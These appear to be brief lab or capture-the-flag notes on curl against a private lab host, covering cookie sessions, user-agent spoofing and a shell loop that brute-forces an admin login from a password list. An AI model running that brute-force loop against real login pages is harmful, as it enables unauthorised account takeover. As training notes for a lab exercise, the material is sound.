## Using Cookies and Sessions
```sh
# Save the cookies
curl -c cookies.txt -d "username=admin&password=admin" http://10.65.182.26/session.php
# - The `-c` option writes any cookies received from the server into a file (`cookies.txt` in this case).
# - You'll often see a session cookie like `PHPSESSID=xyz123`.

# Reuse the saved cookies
curl -b cookies.txt http://10.65.182.26/session.php
# The `-b` option tells cURL to send the saved cookies in the next request, just like a browser would.
```
## Login Bruteforce
```sh
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.65.182.26/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```
## User Agent
`curl -A 'secretcomputer' -s http://10.65.182.26/terminal.php?action=login -d 'username=x&password=y'`